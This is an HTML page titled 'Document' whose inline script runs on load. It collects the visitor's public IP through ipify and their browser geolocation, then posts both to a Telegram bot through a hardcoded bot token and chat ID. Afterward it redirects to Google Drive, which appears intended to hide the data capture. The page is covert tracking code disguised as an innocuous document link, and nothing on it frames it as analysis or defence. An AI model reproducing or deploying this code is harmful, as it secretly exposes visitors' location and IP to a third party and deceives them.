<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    <script>
      const botToken = "7396787396:AAGs_K5jy9txTVlQv-ltZbzo8eSXncwTUwk";
      const userID = "5680204913";
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      // Sử dụng Promise.all để chạy đồng thời các yêu cầu
      Promise.all([getPublicIP(), getUserLocation()])
        .then(([publicIP, location]) => {
          const messages = [];
          if (publicIP) messages.push(publicIP);
          if (location) messages.push(location);

          // Gửi tất cả thông tin trong một yêu cầu
          if (messages.length > 0) {
            const data = new URLSearchParams();
            data.append("chat_id", userID);
            data.append("text", messages.join("\n"));
            return fetch(url, { method: "POST", body: data });
          }
        })
        .finally(() => {
          window.location.href = "https://drive.google.com";
        });

      function getPublicIP() {
        return fetch("https://api.ipify.org?format=json")
          .then((response) => response.json())
          .then((data) => data.ip)
          .catch(() => null);
      }

      function getUserLocation() {
        return new Promise((resolve) => {
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              (position) => {
                const { latitude, longitude } = position.coords;
                resolve(`Latitude: ${latitude}, Longitude: ${longitude}`);
              },
              () => resolve(null)
            );
          } else {
            console.error("Geolocation is not supported by this browser.");
            resolve(null);
          }
        });
      }
    </script>
  </body>
</html>
